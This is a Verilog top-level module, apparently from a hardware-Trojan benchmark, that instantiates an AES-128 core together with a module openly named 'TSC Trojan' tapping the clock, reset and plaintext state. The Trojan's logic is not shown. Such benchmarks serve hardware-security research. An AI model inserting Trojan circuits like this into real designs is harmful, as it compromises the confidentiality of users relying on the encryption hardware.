`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company: 
// Engineer: 
// 
// Create Date:    18:35:35 03/08/2013 
// Design Name: 
// Module Name:    top 
// Project Name: 
// Target Devices: 
// Tool versions: 
// Description: 
//
// Dependencies: 
//
// Revision: 
// Revision 0.01 - File Created
// Additional Comments: 
//
//////////////////////////////////////////////////////////////////////////////////
module top(clk, rst, state, key, out);
    input          clk, rst;
    input  [127:0] state, key;
    output [127:0] out;

		aes_128 AES (clk, state, key, out);
		TSC Trojan (clk, rst, state);

endmodule
